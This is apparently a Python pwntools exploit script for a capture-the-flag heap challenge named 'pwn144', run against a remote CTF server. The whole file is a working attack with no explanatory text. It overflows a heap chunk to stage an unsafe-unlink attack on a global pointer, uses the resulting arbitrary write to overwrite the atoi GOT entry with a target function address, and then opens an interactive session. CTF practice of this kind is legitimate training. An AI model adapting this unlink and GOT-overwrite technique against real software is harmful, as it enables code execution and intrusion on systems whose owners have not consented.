from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
context.terminal = ['tmux', 'split-window', '-h', '-p', '50', '-c', '#{pane_current_path}']

#io = remote('pwn.challenge.ctf.show',28173)
GDBSCRIPT = r'''
'''
elf = ELF('./pwn144')
def start():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=GDBSCRIPT)
    io = process([elf.path])
    if args.ATTACH:
        gdb.attach(io, gdbscript=GDBSCRIPT)
    return io
def add(length,name):
        io.recvuntil(b"choice :")
        io.sendline(b'1')
        io.recvuntil(b'Size of Heap : ')
        io.sendline(str(length))
        io.recvuntil(b"Content of heap:")
        io.sendline(name)

def edit(idx,length,name):
        io.recvuntil(b"choice :")
        io.sendline(b'2')
        io.recvuntil(b"Index :")
        io.sendline(str(idx))
        io.recvuntil(b"Size of Heap : ")
        io.sendline(str(length))
        io.recvuntil(b'Content of heap : ')
        io.sendline(name)

def delete(idx):
        io.recvuntil(b"choice :")
        io.sendline(b"3")
        io.recvuntil(b"Index :")
        io.sendline(str(idx))
io=remote('pwn.challenge.ctf.show',28216)
ptr=0x6020C0
fd=ptr-0x18
bk=ptr-0x10
add(0x80,b'aaaa')
add(0x80,b'bbbb')
add(0x80,b'cccc')
py1 = p64(0) + p64(0x81) + p64(fd) + p64(bk)
py1 += b"a"*0x60
py1 += p64(0x80) + p64(0x90)
edit(0,0x90,py1)
delete(1)
pause()
py2 = b'a'*0x18 + p64(elf.got['atoi'])
edit(0,0x20,py2)
edit(0,0x8,p64(0x400D6D))
io.recvuntil(b"choice :")
io.sendline(b"4")
io.interactive()